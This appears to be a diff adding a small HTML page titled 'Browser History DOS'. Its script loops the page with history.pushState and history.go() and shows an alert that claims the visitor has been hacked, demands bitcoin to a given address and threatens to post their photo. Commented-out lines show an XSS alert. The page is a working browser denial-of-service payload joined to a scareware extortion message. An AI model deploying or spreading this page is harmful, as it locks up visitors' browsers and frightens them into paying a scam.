@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Browser History DOS</title>
+</head>
+<body>
+<p>The alert will run continuously:</p>
+<script>
+    history.pushState(null,null,null);history.go(); 
+    alert("You have been hacked! Please send BTC to the following address 1HesYJSP1QqcyPEjnQ9vzBL1wujruNGe7R or we will post your photo online.");
+
+    //if (history.pushState) {
+    //history.pushState({}, "", location.href.split("?").shift());
+    //alert('XSS Vulnerability detected in\n\n'+ document.domain)
+//}
+
+</script>
+</body>
+</html>
